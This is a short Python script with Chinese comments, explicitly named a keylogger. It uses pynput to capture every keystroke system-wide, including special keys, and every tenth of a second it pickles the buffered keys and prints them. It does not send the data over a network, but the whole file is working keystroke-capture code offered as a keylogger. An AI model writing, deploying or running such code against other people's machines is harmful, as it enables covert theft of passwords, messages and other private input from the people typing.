import asyncio
import pickle
import struct
from pynput import keyboard

# 存储按键数据的缓冲区
key_buffer = []

# 定义按键事件回调
def on_press(key):
    try:
        # 如果按下的是可打印字符的键
        key_buffer.append(str(key.char) if hasattr(key, 'char') else str(key))
    except AttributeError:
        # 如果是特殊按键（如方向键，shift，ctrl等），记录为按键名
        key_buffer.append(str(key))

# 持续检查并处理缓冲区
async def process_key_buffer():
    while True:
        # 如果缓冲区中有按键，进行序列化并输出
        if key_buffer:
            # 序列化按键数据
            data = pickle.dumps(key_buffer)
            size = struct.pack('L', len(data))  # 获取数据大小

            print(f"Serialized data size: {len(data)}")
            print(f"Serialized data: {data}")

            # 清空缓冲区
            key_buffer.clear()

        await asyncio.sleep(0.1)  # 每0.1秒检查一次

# 启动键盘监听器并运行
def start_keylogger():
    # 启动键盘监听器
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # 启动监听器

    # 启动缓冲区处理的异步任务
    asyncio.run(process_key_buffer())

    listener.join()  # 等待监听器结束

# 启动键盘监听器并运行
if __name__ == "__main__":
    start_keylogger()
